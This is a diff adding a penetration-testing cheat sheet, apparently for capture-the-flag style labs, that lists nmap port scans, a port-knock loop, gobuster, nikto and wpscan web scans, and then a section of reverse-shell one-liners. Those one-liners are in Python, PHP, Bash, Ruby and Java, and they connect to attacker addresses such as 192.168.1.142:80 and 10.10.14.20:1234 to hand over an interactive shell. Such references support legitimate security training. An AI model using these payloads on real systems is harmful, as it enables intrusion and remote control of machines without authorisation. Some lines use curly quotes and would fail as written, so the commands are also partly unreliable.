@@ -1,0 +1,72 @@
+Nmap
+====
+
+Quick TCP Scan:
+nmap -sC -sV -vv -oA quick 10.10.10.10
+
+Quick UDP Scan:
+nmap -sU -sV -vv -oA quick_udp 10.10.10.10
+
+Full TCP Scan:
+nmap -sC -sV -p- -vv -oA full 10.10.10.10
+
+Port knock:
+for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done
+
+
+Web Scanning
+============
+
+Gobuster quick directory busting:
+gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux
+
+Gobuster comprehensive directory busting:
+gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'
+
+Gobuster search with file extension:
+gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php
+
+Nikto web server scan:
+nikto -h 10.10.10.10
+
+Wordpress scan:
+wpscan -u 10.10.10.10/wp/
+
+
+Reverse Shells 
+===============
+
+PYTHON:
+python -c 'import pty; pty.spawn("/bin/bash")
+
+or 
+
+python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.1.142”,80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’
+
+then run: 
+export TERM=xterm-256color
+exec /bin/bash
+
+PVP:
+$sock = fsockopen("10.10.14.20",1234);
+$proc = proc_open("/bin/bash -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
+
+or 
+
+php -r ‘$sock=fsockopen(“10.10.14.20”,1234);exec(“/bin/sh -i <&3 >&3 2>&3”);’
+(Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)
+
+Bash
+exec 5<>/dev/tcp/192.168.1.142/80
+cat <&5 | while read line; do $line 2>&5 >&5; done
+
+or
+while read line 0<&5; do $line 2>&5 >&5; done
+
+RUBY
+ruby -rsocket -e’f=TCPSocket.open(“192.168.1.142”,80).to_i;exec sprintf(“/bin/sh -i <&%d >&%d 2>&%d”,f,f,f)’
+
+JAVA
+r = Runtime.getRuntime()
+p = r.exec([“/bin/bash”,”-c”,”exec 5<>/dev/tcp/192.168.1.142/80;cat <&5 | while read line; do \$line 2>&5 >&5; done”] as String[])
+p.waitFor()
